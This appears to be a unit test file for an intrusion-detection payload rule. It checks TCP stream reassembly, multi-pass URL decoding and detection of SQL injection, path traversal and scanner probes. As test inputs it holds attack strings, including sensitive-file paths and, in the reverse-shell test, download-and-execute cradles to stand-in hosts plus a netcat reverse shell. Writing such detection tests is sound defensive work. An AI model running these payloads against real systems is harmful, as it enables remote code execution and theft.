import os
import sys
import unittest

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from engine.rules import PayloadRule


class TestPayloadRule(unittest.TestCase):
    def setUp(self):
        self.rule = PayloadRule(max_bytes=128, stream_timeout=5, max_streams=2)

    @staticmethod
    def packet(payload, seq, ts=100, **overrides):
        record = {
            "type": "IP", "protocol": "TCP", "src_ip": "192.0.2.10",
            "dst_ip": "192.0.2.80", "src_port": 40000, "dst_port": 80,
            "payload": payload, "tcp_payload_seq": seq, "timestamp": ts,
        }
        record.update(overrides)
        return record

    def test_packet_payload_signature_still_fires(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION SELECT password", 1000))
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_percent_and_form_encoded_signatures_are_detected(self):
        percent = self.rule.check(self.packet(b"GET /?q=%55NION%20SELECT", 1000))
        self.assertIsNotNone(percent)
        self.assertEqual(percent["evidence"]["hits"][0]["representation"], "percent_decoded")
        form = self.rule.check(self.packet(b"GET /?q=UNION+SELECT", 2000, src_port=40001))
        self.assertIsNotNone(form)
        self.assertEqual(form["evidence"]["hits"][0]["representation"], "form_decoded")

    def test_encoded_literal_plus_is_not_misread_as_form_space(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION%2BSELECT", 3000))
        self.assertIsNone(alert)

    def test_signature_split_across_contiguous_segments_fires(self):
        first = b"GET /?q=UNION SEL"
        second = b"ECT password FROM users"
        self.assertIsNone(self.rule.check(self.packet(first, 1000)))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["inspection"], "packet_and_bounded_tcp_stream")

    def test_sequence_gap_does_not_join_unrelated_payloads(self):
        self.assertIsNone(self.rule.check(self.packet(b"UNION ", 1000)))
        self.assertIsNone(self.rule.check(self.packet(b"SELECT", 2000, ts=101)))

    def test_out_of_order_segments_are_joined_only_after_gap_is_filled(self):
        first = b"UNION "
        middle = b"SEL"
        last = b"ECT"
        self.assertIsNone(self.rule.check(self.packet(first, 1000, ts=100)))
        # Queue the tail while bytes between it and the current stream are missing.
        self.assertIsNone(self.rule.check(self.packet(last, 1000 + len(first) + len(middle), ts=101)))
        alert = self.rule.check(self.packet(middle, 1000 + len(first), ts=102))
        self.assertIsNotNone(alert)

    def test_in_order_segment_discards_a_fully_covered_queued_segment(self):
        first = b"ordinary "
        queued = b"bytes"
        self.rule.check(self.packet(first, 1000, ts=100))
        self.rule.check(
            self.packet(queued, 1000 + len(first) + 3, ts=101)
        )
        key = ("192.0.2.10", 40000, "192.0.2.80", 80)
        self.assertIn(1000 + len(first) + 3, self.rule._streams[key][3])

        # This in-order segment advances past all of the queued bytes.
        self.rule.check(
            self.packet(b"middle" + queued, 1000 + len(first), ts=102)
        )
        self.assertEqual(self.rule._streams[key][3], {})

        # New out-of-order data must still be accepted after the old segment
        # was retired from the bounded queue.
        next_seq = self.rule._streams[key][0]
        self.rule.check(self.packet(b"next", next_seq + 2, ts=103))
        self.assertEqual(list(self.rule._streams[key][3].values()), [b"next"])

    def test_retransmitted_segment_does_not_repeat_stream_match(self):
        first = b"UNION SEL"
        second = b"ECT password"
        self.rule.check(self.packet(first, 1000))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertIsNone(self.rule.check(self.packet(second, 1000 + len(first), ts=102)))

    def test_sequence_wraparound_is_contiguous(self):
        first = b"UNION SEL"
        start = 0xFFFFFFFC
        self.rule.check(self.packet(first, start))
        second_seq = (start + len(first)) & 0xFFFFFFFF
        alert = self.rule.check(self.packet(b"ECT", second_seq, ts=101))
        self.assertIsNotNone(alert)

    def test_stream_state_expires_and_flow_count_is_bounded(self):
        self.rule.check(self.packet(b"UNION ", 1000))
        self.rule.check(self.packet(b"harmless", 2000, ts=101, src_port=40001))
        self.rule.check(self.packet(b"harmless", 3000, ts=102, src_port=40002))
        self.assertLessEqual(len(self.rule._streams), 2)
        self.rule.prune_stale(200)
        self.assertEqual(self.rule._streams, {})

    def test_stream_capacity_evicts_least_recently_active_flow(self):
        self.rule.check(self.packet(b"first", 1000, src_port=40000))
        self.rule.check(self.packet(b"second", 2000, src_port=40001))
        self.rule.check(self.packet(b"touch", 1005, src_port=40000, ts=102))
        self.rule.check(self.packet(b"third", 3000, src_port=40002, ts=103))
        self.assertIn(("192.0.2.10", 40000, "192.0.2.80", 80), self.rule._streams)
        self.assertNotIn(("192.0.2.10", 40001, "192.0.2.80", 80), self.rule._streams)

    def test_fin_or_rst_releases_stream_state(self):
        self.rule.check(self.packet(b"ordinary", 1000, tcp_flags=0x04))
        self.assertEqual(self.rule._streams, {})

    def test_double_url_encoded_sqli_is_detected(self):
        # %2555 -> %55 -> U; %2520 -> %20 -> space
        alert = self.rule.check(self.packet(b"GET /?q=%2555NION%2520SELECT", 4000))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_double_url_encoded_path_traversal(self):
        # Double-encoded ../../ and double-encoded win.ini:
        # %252e%252e/%252e%252e/ -> %2e%2e/%2e%2e/ -> ../../
        # %2577%2569%256e%252e%2569%256e%2569 -> %77%69%6e%2e%69%6e%69 -> win.ini
        alert = self.rule.check(self.packet(b"GET /dl?f=%252e%252e/%252e%252e/%2577%2569%256e%252e%2569%256e%2569", 4100))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "PATH_TRAVERSAL")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_triple_url_encoded_command_injection(self):
        # %25252fbin%25252fsh -> %252fbin%252fsh -> %2fbin%2fsh -> /bin/sh
        alert = self.rule.check(self.packet(b"GET /run?c=%25252fbin%25252fsh", 4200))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_null_byte_word_splitting_evasion(self):
        # /bin/s\x00h -> /bin/sh via null_byte_stripped
        alert = self.rule.check(self.packet(b"GET /run?c=/bin/s%00h", 4300))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_stripped")

    def test_null_byte_token_separation_evasion(self):
        # UNION\x00SELECT -> UNION SELECT via null_byte_normalized
        alert = self.rule.check(self.packet(b"GET /?q=UNION%00SELECT", 4400))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_normalized")

    def test_inline_sql_comment_evasion(self):
        # UNION/**/SELECT -> UNION SELECT via comment_normalized
        alert = self.rule.check(self.packet(b"GET /search?id=1'/**/UNION/**/SELECT/**/1,2", 4500))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_or_1_equals_1_inline_comment_evasion(self):
        alert = self.rule.check(self.packet(b"GET /login?user=admin'/*comment*/OR/*comment*/1=1", 4600))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_scanner_probe_user_agents(self):
        for ua in (b"sqlmap/1.7#stable", b"Mozilla/5.00 (Nikto/2.1.6)", b"gobuster/3.1.0", b"nuclei"):
            pkt = self.packet(b"GET /api HTTP/1.1\r\nUser-Agent: " + ua + b"\r\n\r\n", 5000)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for scanner User-Agent: {ua}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SCANNER_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_sensitive_file_probe(self):
        for path in (b"/.env", b"/.env.local", b"/.git/config", b"/id_rsa", b"/.aws/credentials", b"/wp-config.php"):
            pkt = self.packet(b"GET " + path + b" HTTP/1.1\r\nHost: example.com\r\n\r\n", 5100)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for sensitive file probe: {path}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SENSITIVE_FILE_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_reverse_shell_cradle(self):
        cradles = (
            b"; curl http://attacker.com/sh | sh ;",
            b"; wget -qO- http://attacker.com/b | bash ;",
            b"powershell -nop -enc JABzAD0...",
            b"IEX (New-Object Net.WebClient).DownloadString('http://bad.com/p')",
            b"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
        )
        for cradle in cradles:
            pkt = self.packet(b"POST /submit HTTP/1.1\r\nContent-Length: 100\r\n\r\ncmd=" + cradle, 5200)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for reverse shell cradle: {cradle}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("REVERSE_SHELL_CRADLE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_benign_web_traffic_does_not_fire(self):
        benign_requests = (
            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            b"GET /static/css/app.css HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)\r\n\r\n",
            b"POST /api/contact HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.88.1\r\nContent-Length: 18\r\n\r\nname=Alice&env=prod",
        )
        for req in benign_requests:
            pkt = self.packet(req, 5300)
            alert = self.rule.check(pkt)
            self.assertIsNone(alert, f"Unexpected alert on benign request: {req}")


if __name__ == "__main__":
    unittest.main()
